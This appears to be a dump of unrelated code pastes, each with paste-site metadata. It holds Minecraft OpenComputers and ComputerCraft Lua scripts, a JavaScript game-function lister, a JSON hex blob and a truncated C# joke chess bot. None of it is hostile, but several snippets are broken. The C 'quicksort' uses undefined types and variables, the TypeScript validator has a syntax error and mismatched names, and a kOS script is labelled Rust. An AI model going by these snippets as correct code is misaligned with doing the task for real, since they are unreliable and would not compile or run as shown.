    online_value_width = defaultSlotValue * 3,

    tpsTextWith = defaultSlotValue * 3,
    tpsValueWidth = defaultSlotValue * 2,

    me_item_width = defaultSlotValue * 4,

    players_near_title_width = defaultSlotValue * 5,

    monitoring_me_title_width = defaultSlotValue * 5,

    status_player_title_width = defaultSlotValue * 5,
    status_player_box_width = defaultSlotValue,

    memory_status_width = defaultSlotValue * 6
}
-------------{TIME OPTIONS}------------------
local TIME_ZONE = 0 --Ваш часовой пояс
local t_correction = TIME_ZONE * 3600
---------------------------------------------

local localize = {
    time = ""§9Время:"",
    tps = ""TPS:"",
    avg_tps = ""Avg TPS:"",
    join_in_game = "" §7вошел в игру!"",
    left_from_game = "" §7покинул игру!"",
    user_online = ""online"",
    user_offline = ""offline"",
    near_ME = ""Игроки рядом"",
    monitoring_me_title = ""Мониторинг МЭ"",
    status_players_title = ""Статус игроков""
}
local colors = {
    time_color = 0x0000CD, --Время 00:00:00
    tps_title_color = 0x0000CD, --TPS и Avg TPS
    tps_value_color = 0x0000CD, --значения тпс цвет
    monitoring_me_title_color = 0x0000CD, --Мониторинг МЭ надпись
    monitoring_me_item_count_color = 0x0000CD, --Мониторинг МЭ цвет количества
    players_near_title_color = 0x0000CD, --Игроки поблизости цвет
    player_near_nickname_color = 0x0000CD, --Цвет никнейма игрока поблизости
    player_status_title_color = 0x0000CD, --Статус игроков цвет надписи
    player_status_nickname_color = 0x0000CD, --Никнейм статуса игроков цвет
    player_status_online_color = 0x00FF00, --цвет бокса при онлайн игроке
    player_status_offline_color = 0xFF0000, --цвет бокса при оффлайн игроке
    memory_info_color = 0x0000CD, --Память 200 MB/4134 MB - цвет
    memory_percent_color = 0x0000CD, --Проценты памяти 40% цвет

    white = 0xFFFFFF,
    charge_level_color = 0x55FF55, --заряд предметов цвет
    not_charge_level_color = 0x000000
}
--------------------------------------------
timeConstant = 1
joke = 0
tSlot = 1
TPS = {}
avgTPS = 0
for tSlot=1,10 do
    TPS[tSlot]=0
end
--------------------------------------------
local absoluteYIndex = constraints.topBorderAbsolute

function time()
    local f = fs.open(""/tmp/timeFile"",""w"")
    f:write(""test"")
    f:close()
    return(fs.lastModified(""/tmp/timeFile""))
end

local function drawSlot(x, y, slotWidth, slotHeight, textToDrawInSlot, textColorToDrawInSlot, bgColor)
    local borderColor = 0xFFFFFF
    local borderWidth = 1

    peripherals.bridge.addLine({ x, y }, { x, y + slotHeight }, borderColor)
    peripherals.bridge.addLine({ x + slotWidth, y }, { x + slotWidth, y + slotHeight }, borderColor)
    peripherals.bridge.addLine({ x, y }, { x + slotWidth, y }, borderColor)
    peripherals.bridge.addLine({ x, y + slotHeight }, { x + slotWidth, y + slotHeight}, borderColor)
    peripherals.bridge.addBox(x + borderWidth, y + borderWidth, slotWidth - 2, slotHeight - 2, bgColor or 0xCCCCCC, 0.5)

    if textToDrawInSlot and textColorToDrawInSlot then
        local marginTop = (slotHeight - 8) / 2
        addText(x + 3, y + marginTop, textToDrawInSlot, textColorToDrawInSlot)
    end
end

function check()
    if settings.chat_box then
        if component.isAvailable(""chat_box"") then
            peripherals.chat_box = component.chat_box
            peripherals.chat_box.setName(settings.chat_box_name)
        else
            settings.chat_box = false
        end
    end
    if settings.me_items then
        if component.isAvailable(""me_interface"") then
            peripherals.me_interface = component.me_interface
        else
            settings.me_items = false
        end
    end
    if settings.sensor_players then
        if component.isAvailable(""openperipheral_sensor"") then
            peripherals.sensor = component.openperipheral_sensor
        else
            settings.sensor_players = false
        end
    end
    componentsOnScreen()
end

function getFreeMemory()
    if settings.memory_monitoring then
        local current = math.floor((computer.freeMemory() / 1000))
        local total = math.floor((computer.totalMemory() / 1000))
        drawSlot(constraints.leftBorderAbsolute + constraints.timeTextWidth + constraints.status_player_title_width, constraints.topBorderAbsolute, constraints.memory_status_width, defaultSlotValue, ""MEM: ""..current..""mb""..""/""..total..""mb"", colors.memory_info_color)
        local freePercent = math.floor(((computer.freeMemory() / computer.totalMemory()) * 100))
        drawSlot(constraints.leftBorderAbsolute + constraints.timeTextWidth + constraints.status_player_title_width + constraints.memory_status_width, constraints.topBorderAbsolute, defaultSlotValue * 1.5, defaultSlotValue, freePercent .. ""%"", colors.memory_percent_color)
    end
end

local function getTimeHost()
    local file = io.open('/tmp/UNIX.tmp', 'w')
    file:write('TIME_ZONE = '..TIME_ZONE)
    file:close()
    local lastmod = tonumber(string.sub(fs.lastModified('/tmp/UNIX.tmp'), 1, -4)) + t_correction
    local dt = os.date('%H:%M:%S', lastmod)
    return dt
end

function addBox(x, y, w, h, color, tran)
    peripherals.bridge.addBox(x, y, w, h, color, tran)
end

function addText(x, y, text, color)
    peripherals.bridge.addText(x, y, text, color)
end

function addIcon(x, y, name, meta)
    peripherals.bridge.addIcon(x, y, name, meta)
end

function gui()
    w, h = gpu.maxResolution()
    gpu.fill(1, 1, w, h, "" "")
end

function componentsOnScreen()
    gpu.set(1, 1, ""Chat-box: "" .. tostring(settings.chat_box))
    gpu.set(1, 2, ""ME: "" .. tostring(settings.me_items))
    gpu.set(1, 3, ""Sensor: "" .. tostring(settings.sensor_players))
    gpu.set(1, 4, ""TPS: "" .. tostring(settings.tps))
end

function addMEInfo(network)
    drawSlot(constraints.leftBorderAbsolute, absoluteYIndex, constraints.monitoring_me_title_width, defaultSlotValue, localize.monitoring_me_title, colors.monitoring_me_title_color)
    absoluteYIndex = absoluteYIndex + defaultSlotValue
    if settings.me_items then
        for i = 1, #items do
            local itemCount = getSize(network, items[i].id, items[i].dmg)
            drawSlot(constraints.leftBorderAbsolute, absoluteYIndex, defaultSlotValue, defaultSlotValue)
            addIcon(constraints.leftBorderAbsolute + 1, absoluteYIndex + 1, items[i].id, items[i].dmg)
            drawSlot(constraints.leftBorderAbsolute + defaultSlotValue, absoluteYIndex, constraints.me_item_width, defaultSlotValue, itemCount, colors.monitoring_me_item_count_color)
            absoluteYIndex = absoluteYIndex + defaultSlotValue
        end
    end
end

function getSize(network,name,dmg)
    local count = 0
    for _, item in ipairs(network) do
        if item.name == name and item.damage == dmg then
            count = count + item.size
        end
    end
    return string.format(""%u"", count)
end

function setTime()
    local timeText = localize.time .. "" ""..getTimeHost()
    drawSlot(constraints.leftBorderAbsolute, absoluteYIndex, constraints.timeTextWidth, defaultSlotValue, timeText, colors.time_color)
    absoluteYIndex = absoluteYIndex + defaultSlotValue
end

function checkOnline(n)
    computer.removeUser(settings.admin)
    if computer.addUser(players[n].name) then
        computer.removeUser(players[n].name)
        if not players[n].isJoin then
            if cb then
                chat_box.say(""§a""..players[n].name .. localize.join_in_game)
            end
            players[n].isJoin = true
        end
        return true
    else
        if players[n].isJoin then
            if cb then
                chat_box.say(""§c""..players[n].name .. localize.left_from_game)
            end
            players[n].isJoin = false
        end
        computer.removeUser(players[n].name)
        return false
    end
end

function drawOnline()
    absoluteYIndex = constraints.topBorderAbsolute
    drawSlot(constraints.timeTextWidth + constraints.leftBorderAbsolute, absoluteYIndex, constraints.status_player_title_width, defaultSlotValue, localize.status_players_title, colors.player_status_title_color)
    absoluteYIndex = absoluteYIndex + defaultSlotValue
    for i = 1, #players do
        if not players[i].isHideOnline then
            drawSlot(constraints.timeTextWidth + constraints.leftBorderAbsolute, absoluteYIndex, constraints.nickname_width, defaultSlotValue, players[i].name, colors.player_status_nickname_color)

            if checkOnline(i) then
                drawSlot(constraints.timeTextWidth + constraints.nickname_width + constraints.leftBorderAbsolute, absoluteYIndex, constraints.status_player_box_width, defaultSlotValue, nill, nill, colors.player_status_online_color)
            else
                drawSlot(constraints.timeTextWidth + constraints.nickname_width + constraints.leftBorderAbsolute, absoluteYIndex, constraints.status_player_box_width, defaultSlotValue, nill, nill, colors.player_status_offline_color)
            end
            absoluteYIndex = absoluteYIndex + defaultSlotValue
        end
    end
end

function getPlayersNearME()
    local temp = peripherals.sensor.getPlayers()
    local playersCount = #temp
    for g = 1, #temp do
        for j = 1, #players do
            if players[j].name == temp[g].name and players[j].isHideOnline then
                playersCount = playersCount - 1
            end
        end
    end
    if playersCount > 0 then
        drawSlot(constraints.leftBorderAbsolute, absoluteYIndex, constraints.players_near_title_width, defaultSlotValue, localize.near_ME, colors.players_near_title_color)
        absoluteYIndex = absoluteYIndex + defaultSlotValue
    end
    if settings.player_items then
        for i = 1, #temp do
            local isShowPlayer = true
            for j = 1, #players do
                if players[j].name == temp[i].name and players[j].isHideOnline then
                    isShowPlayer = false
                    break
                end
            end
            if isShowPlayer then
                drawPlayerDetails(constraints.leftBorderAbsolute, absoluteYIndex, temp[i].name, defaultSlotValue)
                absoluteYIndex = absoluteYIndex + defaultSlotValue
            end
        end
    end
end

function drawPlayerDetails(startX, startY, playerName, slotSize)
    local inventory = peripherals.sensor.getPlayerByName(playerName).all().player.inventory
    drawSlot(startX, startY, constraints.nickname_width, slotSize, playerName, colors.player_near_nickname_color)
    local slotAreaX = startX + constraints.nickname_width - slotSize--todo
    local slotAreaY = startY
    for i = 1, 9 do
        local slotX = slotAreaX + (i * slotSize)
        local slotY = slotAreaY
        drawSlot(slotX, slotY, slotSize, slotSize)
        local inventorySlotLink = inventory[i]
        if inventorySlotLink then
            local inventorySlot = inventorySlotLink.all()
            addIcon(slotX + 1, slotY + 1 , inventorySlot.id, inventorySlot.dmg)
            if inventorySlot.qty and inventorySlot.qty > 1 then
                if inventorySlot.qty > 9 then
                    addText(slotX + slotSize/2 - 3, slotY + slotSize/2 + 1, string.format(""%u"", inventorySlot.qty), colors.white)
                else
                    addText(slotX + slotSize/2 + 3, slotY + slotSize/2 + 1, string.format(""%u"", inventorySlot.qty), colors.white)
                end
            end
            if inventorySlot.electric then
                if inventorySlot.electric.charge then
                    local gapX = 2
                    local gapBottom = 3
                    local barWidth = slotSize - gapX * 2
                    local chargePercent = inventorySlot.electric.charge / inventorySlot.electric.maxCharge
                    local chargeWidth = barWidth * chargePercent
                    addBox(slotX + gapX, slotY + slotSize - gapBottom, barWidth, 1, colors.not_charge_level_color, 1)
                    addBox(slotX + gapX, slotY + slotSize - gapBottom, chargeWidth, 1, colors.charge_level_color, 1)
                end
            end
            if inventorySlot.energy_te then
                if inventorySlot.energy_te.energyStored < inventorySlot.energy_te.maxEnergyStored then
                    local gapX = 2
                    local gapBottom = 3
                    local barWidth = slotSize - gapX * 2
                    local chargePercent = inventorySlot.energy_te.energyStored / inventorySlot.energy_te.maxEnergyStored
                    local chargeWidth = barWidth * chargePercent
                    addBox(slotX + gapX, slotY + slotSize - gapBottom, barWidth, 1, colors.not_charge_level_color, 1)
                    addBox(slotX + gapX, slotY + slotSize - gapBottom, chargeWidth, 1, colors.charge_level_color, 1)
                end
            end
        end
    end
end

function getCurrentTPS()
    realTimeOld = time()
    os.sleep(timeConstant)
    realTimeNew = time()
    realTimeDiff = realTimeNew-realTimeOld
    TPS[tSlot] = 20000*timeConstant/realTimeDiff
    avgTPS = (TPS[1]+TPS[2]+TPS[3]+TPS[4]+TPS[5]+TPS[6]+TPS[7]+TPS[8]+TPS[9]+TPS[10])/10
    drawSlot(constraints.leftBorderAbsolute, absoluteYIndex, constraints.tpsTextWith, defaultSlotValue, localize.tps, colors.tps_title_color)
    drawSlot(constraints.leftBorderAbsolute + constraints.tpsTextWith, absoluteYIndex, constraints.tpsValueWidth, defaultSlotValue, string.format(""%.2f"",TPS[tSlot]), colors.tps_value_color)
    absoluteYIndex = absoluteYIndex + defaultSlotValue
    drawSlot(constraints.leftBorderAbsolute, absoluteYIndex, constraints.tpsTextWith, defaultSlotValue, localize.avg_tps, colors.tps_title_color)
    drawSlot(constraints.leftBorderAbsolute + constraints.tpsTextWith, absoluteYIndex, constraints.tpsValueWidth, defaultSlotValue, string.format(""%.2f"",avgTPS), colors.tps_value_color)
    absoluteYIndex = absoluteYIndex + defaultSlotValue
    if tSlot == 10 then
        tSlot = 0
    end
    tSlot = tSlot + 1
end

gui()

while true do
    absoluteYIndex = constraints.topBorderAbsolute
    check()
    computer.addUser(settings.admin)
    peripherals.bridge.clear()
    setTime() --время вверху
    if settings.memory_monitoring then
        getFreeMemory()
    end
    if settings.tps then
        getCurrentTPS()
    end
    if settings.me_items then
        local network = peripherals.me_interface.getItemsInNetwork()
        addMEInfo(network)
        network = nil
    end
    if settings.sensor_players then
        mem1 = computer.freeMemory()
        getPlayersNearME()

    end
    drawOnline() --онлайн игроки
    peripherals.bridge.sync()
    os.sleep(timeConstant)
end"
4QDS96Lc,quicksort.c,rjcostales,C,Saturday 22nd of July 2023 08:28:31 AM CDT,"/*
 * C Program To Sort array in ascending order using Quicksort.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#define SIZE 50000

static int compare(const void *a, const void *b)
{
	/* The pointers point to offsets into ""array"",
	   so we need to dereference them to get at the strings. */

	return strcmp(*(const char **) a, *(const char **) b);
}

int main(int argc, char *argv[])
{
	str     page[SIZE];
	int     size = read(page);

   // create an array of random ints
   srand(time(NULL));
   for (int i = 0; i < SIZE; i++) array[i] = rand();

	qsort(page, size, sizeof(const char *), compare);
 
   // output array
   for (int i = 0; i < SIZE; i++) printf(""%i\n"", array[i]);

   return 0;
}
"
nGJPNYa6,WIP list all functions in game,sinkir,JavaScript,Saturday 22nd of July 2023 08:05:58 AM CDT,"/* 
Kitten game, try to list functions recursivly from ""game""
*/


/*
https://stackoverflow.com/questions/7390426/better-way-to-get-type-of-a-javascript-variable
*/
var toType = function(obj) {
  return ({}).toString.call(obj).match(/\s([a-zA-Z]+)/)[1].toLowerCase();
} 

/*
https://stackoverflow.com/questions/30158515/list-all-prototype-properties-of-a-javascript-object
*/
function props(obj) {
    var p = [];
    for (; obj != null; obj = Object.getPrototypeOf(obj)) {
        var op = Object.getOwnPropertyNames(obj);
        for (var i=0; i<op.length; i++)
            if (p.indexOf(op[i]) == -1)
                 p.push(op[i]);
    }
    return p;
}
//console.log(props(game));

////////////////////////////////////////////////////////

if(!game.mods)
{
	game.mods = {};
}
if(!game.mods.listFunction)
{
	game.mods.listFunction = {};
}


game.mods.listFunction.iDeepLevelMax = 10;
game.mods.listFunction.sBlackList = `
game.mods
game
toString
toLocaleString
valueOf
hasOwnProperty
isPrototypeOf
propertyIsEnumerable
__defineGetter__
__defineSetter__
__lookupGetter__
__lookupSetter__
__proto__
constructor
`;

game.mods.listFunction.list = [];




game.mods.listFunction.genListRec = function (sKey, iDeepLevel = 0)
{
	if (iDeepLevel >= game.mods.listFunction.iDeepLevelMax)
	{
		console.log(""iDeepLevel:""+iDeepLevel+"" sKey:""+sKey+"" Too deep"");
		return false;
	}
	sKey = sKey.replaceAll(""["", ""\["");
	sKey = sKey.replaceAll(""]"", ""\]"");
	sKey = sKey.replaceAll(""."", ""\."");
	sReg = ""^""+sKey+""$"";
	
	if(sKey == ""game"" && iDeepLevel == 0)
	{
		console.log(""First run, check game content"");
	}	
	else if (game.mods.listFunction.sBlackList.match(RegExp(sReg, ""m"") ) )
	{
		console.log(""iDeepLevel:""+iDeepLevel+"" sKey:""+sKey+"" BlackListed"");
		return false;
	}
	if(sKey.includes(""-""))
	{
		return false;
	}
	
	var sType = eval('toType('+sKey+')');
	console.log(sType+""  ""+sKey);
	if(sType == ""array"")
	{
		aList = eval(sKey);
		for(var i=0; i<aList.length; i++)
		{
			// detect type, recursiv
			if(sType == ""object"")
			{
				this.genListRec(sKey+""[""+i+""]"", iDeepLevel+1);
			}
			if(sType == ""function"")
			{
				game.mods.listFunction.list.push(sKey+""[""+i+""]"" );
				//game.mods.listFunction.list.push(sKey+""[""+i+""]""+eval(sKey+""[""+i+""].toString().match(/\(.*\)/)[0];"") );
			}
			if(sType == ""array"")
			{
				this.genListRec(sKey+""[""+i+""]"", iDeepLevel+1);
			}			
		}
	}
	else if (sType == ""object"")
	{

		//var aKeys =  eval(""Object.keys(""+sKey+"")"");
		//console.log(sKey);
		var aKeys =  eval(""props(""+sKey+"")"");
		//console.log(aKeys);
		var aKeysFiltered = aKeys.filter(n => !game.mods.listFunction.sBlackList.split(""\n"").includes(n));
		//console.log(aKeysFiltered);

		for(var i=0; i<aKeysFiltered.length; i++)
		{
			
			if(aKeysFiltered[i].includes(""-""))
			{
				continue;
			}
			
			console.log('toType('+sKey+'.'+aKeysFiltered[i]+')');
			var sType = eval('toType('+sKey+'.'+aKeysFiltered[i]+')');
			console.log(sType+""  ""+sKey+'.'+aKeysFiltered[i]);

			if(sType == ""object"")
			{
				this.genListRec(sKey+"".""+aKeysFiltered[i], iDeepLevel+1);
			}
			if(sType == ""function"")
			{
				game.mods.listFunction.list.push(sKey+"".""+aKeysFiltered[i] );
				//game.mods.listFunction.list.push(sKey+"".""+aKeysFiltered[i] + eval(sKey+"".""+aKeysFiltered[i]+"".toString().match(/\(.*\)/)[0];"") );
			}
			if(sType == ""array"")
			{
				this.genListRec(sKey+"".""+aKeysFiltered[i], iDeepLevel+1);
			}
			
		}
	}
	else
	{
		console.log(sKey);
	}

}

game.mods.listFunction.genListRec(""game"");

console.log(game.mods.listFunction.list);"
mmqn2H4g,calculate angle,kane1941,Rust,Saturday 22nd of July 2023 07:34:46 AM CDT,"// Define the bodies.
set bodyA to ship. // Current body (A).
set bodyB to body. // Parent body (B).
set targetC to target. // Target body (C).

// Calculate the vectors using the built-in functions.
set vectorA to bodyA:position:normalized.
set vectorB to bodyB:position:normalized.
set vectorC to targetC:position:normalized.

// Calculate the angle between vectors A and C relative to vector B.
set normal to vcrs(vectorA, vectorB).
set angle to arccos(vdot(vectorC, normal)).

// Convert the angle from radians to degrees.
set angleDegrees to angle * 180 / constant:pi.

// Print the result.
print ""Angle between "" + bodyA:name + "" and "" + targetC:name + "" relative to "" + bodyB:name + "" is: "" + angleDegrees + "" degrees.""."
piExRPQJ,Untitled,WeboGraph,TypeScript,Saturday 22nd of July 2023 07:25:36 AM CDT,"function generateParseValidator(template) {
	return function (str) {
    	const data = JSON.parse(str)
        
        for (const [key, value] of Object.entries(template)) {
        	if (value.validate(data[key]) === false) {
            	data[key] = value.default
            }
        }
        
        return data
    }
}

const template = {
	Vibrant: {
		validator: (val) => Array.isArray(val) && val.every(num => isNaN(num) === false)
		default: [255, 0, 0]
	}
}

const colorParser = generateParseValidator(template)

const test = '{ Vibrant: null }'

colorParser(test) // test.Vibrant = [255, 0, 0]"
Xj9DeqfC,lenyador_wifi.lua,Harton,Lua,Saturday 22nd of July 2023 06:41:37 AM CDT,"local ORCHESTATOR = 2
local PROTOCOL = ""fabricas""
local STOP_SIGNAL = ""stop""
local CONTINUE_SIGNAL = ""continue""
local CONFIRMATION_FREQUENCY = 1
local FILE_NAME = ""state""
local MODEM_POS = ""left""

local function writeSignal(signal)
    if signal == STOP_SIGNAL then
        local file = fs.open(FILE_NAME, ""w"")
        file.write(signal)
        file.close()
    elseif fs.exists(FILE_NAME) then
        fs.delete(FILE_NAME)
    end
end

local function isStopped()
    if not fs.exists(FILE_NAME) then
        return false
    end
    local file = fs.open(FILE_NAME, ""r"")
    local signal = file.readAll()
    file.close()
    return signal == STOP_SIGNAL
end

local function isSappling(info)
    return info and info.tags[""minecraft:saplings""]
end

local function isLog(info)
    return info and info.tags[""minecraft:logs""]
end

local function isLeaves(info)
    return info and info.tags[""minecraft:leaves""]
end

local function isTree(info)
    return isSappling(info) or isLog(info) or isLeaves(info)
end

local function isDirt(info)
    return info and info.name == ""minecraft:dirt""
end

local function isBarrel(info)
    return info and info.name == ""minecraft:barrel""
end

local function isBoneMeal(info)
    return info and info.name == ""minecraft:bone_meal""
end

local function selectSappling()
    for i=1, 16 do
        local detail = turtle.getItemDetail(i, true)
        if isSappling(detail) then
            turtle.select(i)
            return true
        end
    end
    return false
end

local function selectBoneMeal()
    for i=1, 16 do
        local detail = turtle.getItemDetail(i)
        if isBoneMeal(detail) then
            turtle.select(i)
            return true
        end
    end
    return false
end

local function up()
    if not turtle.detectUp() then
        return turtle.up()
    end
    local _, info = turtle.inspectUp()
    if not isTree(info) then
        return false
    end
    return turtle.digUp() and turtle.up()
end

local function down()
    if not turtle.detectDown() then
        return turtle.down()
    end
    local _, info = turtle.inspectDown()
    if not isTree(info) then
        return false
    end
    return turtle.digDown() and turtle.down()
end

local function cutTree()
    while true do
        local climb = false
        for i=1, 4 do
            local det, info = turtle.inspect()
            if det and isTree(info) then
               turtle.dig()
               climb = true
            end
            turtle.suck()
            turtle.turnLeft()
        end
        if not climb then
            return
        end
        if not up() then
            return
        end
    end
end

local function goDown()
    while true do
        local det, info = turtle.inspect()
        if det and isDirt(info) then
            return
        end
        down()
    end
end

local function collapse()
    for i=1, 15 do
        local current = turtle.getItemDetail(i, true)
        for j=i+1, 16 do
            local compare = turtle.getItemDetail(j)
            if current and compare and current.name == compare.name then
                turtle.select(j)
                turtle.transferTo(i)
                if current.count + compare.count >= current.maxCount then
                    break
                end
            end
        end
    end
    turtle.select(1)
end

local function refuel()
    for i=1, 16 do
        local detail = turtle.getItemDetail(i, true)
        if detail then
            if isSappling(detail) then
                if detail.count > 32 then
                    turtle.select(i)
                    turtle.refuel(detail.count - 32)
                end
            elseif not isLog(detail) then
                turtle.select(i)
                turtle.refuel()
            end
        end
    end
    turtle.select(1)
    print(""Fuel: "" .. turtle.getFuelLevel())
end

local function drop()
    collapse()
    while turtle.suckDown() do sleep(0.1) end
    refuel()
    for i=1, 16 do
        local detail = turtle.getItemDetail(i, true)
        if detail and not isSappling(detail) and not isBoneMeal(detail) then
            turtle.select(i)
            turtle.dropDown()
        end
    end
    turtle.select(1)
end

local function start()
    collapse()
    refuel()
    cutTree()
    goDown()
end

local function peek()
    up()
    local found = false
    for i=1, 4 do
        local det, info = turtle.inspect()
        if not det or isSappling(info) then
            if not det then
                selectSappling()
                turtle.place()
            end

            while selectBoneMeal() do
                turtle.place()
                sleep(0.5)
                det, info = turtle.inspect()
                if det and isLog(info) then
                    found = true
                    break
                end
                sleep(0.5)
            end
        else
            found = true
        end
        turtle.turnLeft()
    end
    if not found then
        down()
    end
    return found
end

local function waitForStop(seconds)
    local id, signal = rednet.receive(PROTOCOL, seconds)
    if id == ORCHESTATOR and signal == STOP_SIGNAL then
        print(""Stop signal received!"")
        while not rednet.send(id, STOP_SIGNAL, PROTOCOL) do
            sleep(CONFIRMATION_FREQUENCY)
        end
        writeSignal(STOP_SIGNAL)
        print(""Stopped by orchestator: "" .. ORCHESTATOR)
        return true
    end
    return false
end

local function waitForContinue()
    while true do
        local id, signal = rednet.receive(PROTOCOL)
        if id == ORCHESTATOR and signal == CONTINUE_SIGNAL then
            print(""Continue signal received!"")
            while not rednet.send(id, CONTINUE_SIGNAL, PROTOCOL) do
                sleep(1)
            end
            writeSignal(CONTINUE_SIGNAL)
            print(""Resuming tasks..."")
            return
        end
    end
end

local function wait(seconds)
    turtle.suckUp()
    turtle.suckDown()
    if waitForStop(seconds) then
        waitForContinue()
    end
end

local function restart()
    rednet.open(MODEM_POS)

    local det, info = turtle.inspect()
    if det and isDirt(info) then
        return
    end

    det, info = turtle.inspectDown()
    if det and isBarrel(info) then
        drop()
        up()
        return
    end

    while up() do
        sleep(0.1)
    end

    while down() do
        local _, info = turtle.inspect()
        if isDirt(info) then
            break
        end
        for i=1, 4 do
            turtle.dig()
            turtle.turnLeft()
        end
    end
end

local function main(peekTime)
    restart()
    
    if isStopped() then
        waitForContinue()
    end

    local time = -peekTime
    while true do
        if os.clock() - time > peekTime then
            while peek() do
                start()
                down()
                drop()
                up()
            end
            time = os.clock()
        else
            wait(1)
        end
    end
end

local tArgs = { ... }
local peekTime = tArgs[1] and tonumber(tArgs[1]) or 180
main(peekTime)

"
wbXvHtGL,deliveryman,ZJSSON,Lua,Saturday 22nd of July 2023 06:28:40 AM CDT,"local c=peripheral.find('chatBox')
local m=peripheral.find('meBridge')
local b=peripheral.wrap('minecraft:barrel_5')

local PREFIX=""inventoryManager_""
local BOX=""minecraft:barrel_""
local masters={}
local boxes={}
masters['XiaoGeNintendo']='0'
boxes['XiaoGeNintendo']='4'

function split(str,key)
    print(str.."" ""..key)
    local tb={}
    local count=0
    local tmp=""""
    for i=1,#str do
        print(i..""asd""..string.sub(str,i,i))
        if string.sub(str,i,i)==key then
            print(""NO""..tmp)
            tb[count]=tmp
            count=count+1
            tmp=""""
        else
            print(tmp)
            tmp=tmp..string.sub(str,i,i)
        end
    end

    if tmp~="""" then
        tb[count]=tmp
        count=count+1
    end

    return count,tb
end

function send(msg, usr)
    while true do
        local a=nil
        local b=nil

        if usr~=""*"" then
            a,b=c.sendMessageToPlayer(msg,usr,""Deliveryman"")
        else
            a,b=c.sendMessage(msg,""Deliveryman"")
        end

        if a==true then
            break
        end
        sleep(0.2)
    end
end

function parseChat()
    local event, username, message, uuid, isHidden = os.pullEvent(""chat"")
    print(username..message..uuid)
    if string.sub(message,1,1)~=""!"" then
        print(""Not req"")
        return
    end

    if masters[username]==nil then
        print(""Not ok"")
        send(""You are not registered in the delivery server!"",username)
        return
    end

    local count,items=split(message,"" "")
    local im=peripheral.wrap(PREFIX..masters[username])

    print(count)
    send(""Start preparing things for ""..username.."". Please do not make requests now."",""*"")
    
    send(""Item List:"",username)
    for i=1,count,2 do
        print("">>""..i)
        if (i+1)<count then
            send("">>""..items[i]..""*""..items[i+1],username)
            local tb=m.getItem({name=items[i]})
            if tb==nil or (tb.isCraftable==false and tb.amount<tonumber(items[i+1])) then
                send(""Does not have enough items in AE! Skipped"",username)
            else
                if tb.amount<tonumber(items[i+1]) then
                    send(""Need to craft ""..(tonumber(items[i+1])-tb.amount).."". Please wait patiently"",username)
                    while true do
                        local x,y=m.craftItem({name=items[i],count=tonumber(items[i+1])-tb.amount})
                        if x==true then
                            break
                        else
                            send(""Failed to craft:""..y.."". Retrying"",username)
                            sleep(1)
                        end
                    end
                end

                while true do
                    local tb=m.getItem({name=items[i]})
                    if tb.amount>=tonumber(items[i+1]) then
                        break
                    end
                    sleep(3)
                end
                
                print(BOX..boxes[username])
                m.exportItem({name=items[i],count=tonumber(items[i+1])},""up"")
                for i=1,27 do
                    b.pushItems(BOX..boxes[username],i)
                end
                local tot=0
                while true do
                    local num=im.addItemToPlayer(""east"",tonumber(items[i+1]),nil,items[i])
                    tot=tot+num
                    if tot<tonumber(items[i+1]) then
                        send(""Did not send full batch."",username)
                        sleep(1)
                    else
                        break
                    end
                end

            end
        end
    end

    send(""Request with ""..username.."" has been finished!"",""*"")
end


while true do 
    parseChat()
end"
YyKqgh05,data641,TestGuy1,JSON,Saturday 22nd of July 2023 06:00:06 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '3d5f333937a326d059840e726150ddc27b4ca4deaa43276ab6239fa7f3ea75fc43da65012ba961b8d0aca8f5445199f8e130c27d27dd78602f567100d59c9066c032eabf508d9638b5b077e28807ecc7e3cd7af412e5d14a9a1203a6719007e0cf14b10d4fb018d93609c6bfa93b83945fdddd76bbe019b7405ced717496cd73',
  otherdata: [
    '1e21cd201f09a9777aac0d96a9cfda02',
    '7d7e83b6d60dbb500d91e541cbb37820',
    '644e7ab7a9c0f53db8e5af5f17a38683',
    '39d67d4f11a8fa26d79195f03b8f13c6',
    '7af5ae2a21eca8627d8288df0fb85368',
    '7d78566d715ea06f259cfcc31b47baf4',
    'a375253c25f017ffd6648298e9352673',
    '7fdd3c6e2fb2a48e28919b040c0f19e4'
  ]
}"
DY69XavW,Joke chess bot,ghostkiller967,C#,Saturday 22nd of July 2023 05:42:01 AM CDT,"using ChessChallenge.API;
using System;
using System.Collections.Generic;
using System.Diagnostics;

public class MyBot : IChessBot
{
    public Move Think(Board board, Timer timer)
    {
        int time = (int)Math.Round((DateTime.UtcNow - Process.GetCurrentProcess().StartTime.ToUniversalTime()).TotalSeconds);
        Console.WriteLine(time);
        string expression = $""(5*7*9*13*14*5*9*3*9*4*4 * {time} + (12*10*10*10+3*10*10+4*10+5)) % (10*10*10+1)"";
        Console.WriteLine(""Input Expression: "" + expression);

        // Tokenization and AST generation
        Lexer lexer = new Lexer(expression);
        Token token;
        do
        {
            token = lexer.GetNextToken();
            Console.WriteLine($""Token: {token.Type}, Value: {token.Value}"");
        } while (token.Type != TokenType.EOF);

        Parser parser = new Parser(new Lexer(expression));
        ASTNode root = parser.Parse();
        Console.WriteLine(""\nAST:"");
        PrintAST(root);

        // Transpile to Brainfuck
        string brainfuckCode = BrainfuckTranspiler.Transpile(expression);
        Console.WriteLine(""\nBrainfuck Code:"");
        Console.WriteLine(brainfuckCode);

        // Interpret brainfuck code
        BrainfuckInterpreter interpreter = new BrainfuckInterpreter();
        interpreter.Interpret(brainfuckCode);
        string output = interpreter.GetOutput();
        Move[] legalMoves = board.GetLegalMoves();
        return legalMoves[(int)(output[0] / 1000f * legalMoves.Length)];
    }

    public static void PrintAST(ASTNode node, int indent = 0)
    {
        string indentation = new string(' ', indent * 2);
        Console.WriteLine($""{indentation}{node.Type}({node.Value})"");

        if (node.Left != null)
            PrintAST(node.Left, indent + 1);

        if (node.Right != null)
            PrintAST(node.Right, indent + 1);
    }
}

public class BrainfuckInterpreter
{
    private int dataPointer;
    private int instructionPointer;
    private byte[] memory;
    private List<char> outputBuffer;

    public BrainfuckInterpreter()
    {
        memory = new byte[30000];
        dataPointer = 0;
        instructionPointer = 0;
        outputBuffer = new List<char>();
    }

    public void Interpret(string code)
    {
        while (instructionPointer < code.Length)
        {
            char currentChar = code[instructionPointer];

            switch (currentChar)
            {
                case '>':
                    dataPointer++;
                    break;

                case '<':
                    dataPointer--;
                    break;

                case '+':
                    memory[dataPointer]++;
                    break;

                case '-':
                    memory[dataPointer]--;
                    break;

                case '.':
                    outputBuffer.Add((char)memory[dataPointer]);
                    break;

                case ',':
                    // You can implement input handling here if needed.
                    break;

                case '[':
                    if (memory[dataPointer] == 0)
                    {
                        int loopDepth = 1;
                        while (loopDepth > 0)
